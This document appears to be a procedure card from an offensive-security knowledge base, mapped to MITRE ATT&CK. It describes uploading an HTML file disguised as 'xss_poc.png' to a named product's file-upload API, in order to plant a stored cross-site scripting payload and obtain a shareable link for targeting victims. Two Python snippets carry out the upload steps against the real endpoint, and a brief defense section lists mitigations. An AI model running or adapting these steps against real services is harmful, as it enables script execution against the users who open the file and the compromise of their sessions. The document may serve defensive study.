---
id: 123e4567-e89b-12d3-a456-426614174002
name: Upload-Malicious-HTML-File-via-API
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:47.223Z'
tactics:
  - '[[Execution]]'
techniques:
  - '[[Remote File Copy]]'
  - '[[JavaScript]]'
tags:
  - file-upload
  - xss
  - api
commands:
  - '[[commands/request-upload-url]]'
  - '[[commands/upload-html-file-multipart]]'
platforms:
  - Web
tools:
  - '[[tools/requests]]'
  - '[[tools/requests-toolbelt]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Remote File Copy]]'
  - '[[JavaScript]]'
---

# Upload-Malicious-HTML-File-via-API

## Summary

This procedure uploads a malicious HTML file disguised as an image to Dust's file upload API using a low-privilege account, exploiting lack of sanitization to store XSS payload for later execution.

## Description

Targeting the Dust API endpoint https://dust.tt/api/w/<workspace_sid>/files, this uploads HTML content with 'text/html' type but filename 'xss_poc.png' to bypass image checks. The file contains JavaScript that executes on view. Prerequisites: Dummy account session cookies, malicious HTML file (e.g., with fetch for escalation). Outcomes: Stored file with viewable XSS payload.

## Requirements

1. Authenticated session cookies for dummy member account
2. Workspace SID from setup
3. Malicious HTML file (e.g., xss.html with ~7331 bytes size)
4. Python environment with requests and requests_toolbelt

## Defense

Defensive measures and detection strategies:

- Validate and sanitize all uploaded file content types, rejecting HTML
- Scan uploads for JavaScript patterns before storage
- Log and alert on non-image uploads to conversation useCase

## Objectives

1. Store malicious script in workspace files
2. Obtain shareable downloadUrl for victim targeting
3. Enable stored XSS execution on file view

## Instructions

### Step 1: Request Upload URL

**Context**: Initiate the upload process by posting metadata to get a presigned upload URL.

**Command** ([[commands/request-upload-url]]):
```python
import requests
cookies = {'appSession': '<dummy_account_session>'}
json_data = {'contentType': 'text/html', 'fileName': 'xss_poc.png', 'fileSize': 7331, 'useCase': 'conversation'}
response = requests.post('https://dust.tt/api/w/<workspace_sid>/files', cookies=cookies, json=json_data)
```

> This sends JSON metadata; expected output is JSON with 'file' object containing 'uploadUrl' for the next step.

### Step 2: Upload File Content

**Context**: Use the uploadUrl to post the actual HTML file via multipart form data.

**Command** ([[commands/upload-html-file-multipart]]):
```python
from requests_toolbelt.multipart.encoder import MultipartEncoder
import requests
upload_url = response.json()['file']['uploadUrl']
with open('Dust/xss.html', 'rb') as f:
    m = MultipartEncoder(fields={'file': ('xss_poc.png', f, 'text/html')})
headers = {'Content-Type': m.content_type, 'Origin': 'https://dust.tt'}
response = requests.post(upload_url, headers=headers, cookies=cookies, data=m)
```

> Uploads the file; expected output is JSON with 'downloadUrl' for sharing.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Remote File Copy]] Ingress Tool Transfer
- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used

- [[commands/request-upload-url]]
- [[commands/upload-html-file-multipart]]

## Tools Used

- [[tools/requests]]
- [[tools/requests-toolbelt]]

## Tags

- [[file-upload]]
- [[xss]]
- [[api]]
